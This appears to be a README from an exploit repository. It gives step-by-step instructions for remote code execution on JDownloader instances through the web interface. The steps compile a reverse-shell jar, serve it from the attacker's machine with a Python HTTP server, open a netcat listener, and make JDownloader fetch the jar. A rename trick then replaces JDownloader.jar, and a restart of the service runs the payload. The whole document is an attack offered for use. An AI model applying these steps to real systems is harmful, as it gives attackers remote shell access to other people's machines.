# JDownloader-RCE
Documenting how to exploit JDownloader instances

Tested on Docker container running Linux Alpine 64 bit, bit it should run on windows/linux either way.

# TL;DR

You can upload a .jar file to JDownloader and change its name to `JDownloader.jar` then restart the service, triggering whatever was in the .jar 

# Step 1: Verify environment settings 

1.1 When you get to the JDownloader interface, go to the top left and select 'Help -> About JDownloader'

1.2 Check the Java version and Installation Directory (in this screenshot its JRE 1.8 and `/config`, the config file is covered by the "Click me / Mouse Over")

# Step 2: Create payload 

2.1 Edit the `shell.java` file with your IP and port that you want the reverse shell to come back to. 

2.2 Compile the file. (You may need to change the target and source parameters depending on the JRE from step 1.2)
```bash
javac -target 1.8 -source 1.8 shell.java
jar cmf manifest.mf myprogram.jar shell.class
```


# Step 3: Start server and listener

Open 2 terminals, one to grab your java files from and one with the port you want the reverse shell to come back to.

Terminal 1 : `python3 -m http.server 8081`

Terminal 2 : `nc -nvlp <PORT>`

# Step 4: Upload files

4.1 Go back to the web interface, on the "LinkGrabber" tab and right click. Select 'Add new Links'. 

4.2 Enter your ip like so 'http://<IP>:8081'

4.3 Ensure the directory next to the save icon is the same installation directory from step 1.2

# Step 5: Change file names 

5.1 Expand each folder and download `myprogram.jar` and `manifest.mf` by right clicking on them and selecting `start download` (if you want, you can replace any file with manifest.mf, we just need a placeholder file that has some text in it)  

5.2 Go over to the "downloads" tab and right click on `manifest.mf`. Goto Properties -> Rename. Change the filename to `JDownloader.jar`. You should get an error saying the file already exists. However, the filename within the GUI changes to JDownloader.jar.

5.3 Repeat step 5.2 again, this time renaming the file to `JDownloader.jar.bak`. This will change the actual `JDownloader.jar` within the config directory to `JDownloader.jar.bak`. 

5.4 Change `myprogram.jar` to `JDownloader.jar`. You should not get an error this time, because the previous step changed the original `JDownloader.jar` to `JDownloader.jar.bak`. 

# Step 6: Execute. 

6.1 In the top left, goto `File -> Restart`. This should restart the service, which re-runs the `JDownloader.jar` (which is now our malicious file) 
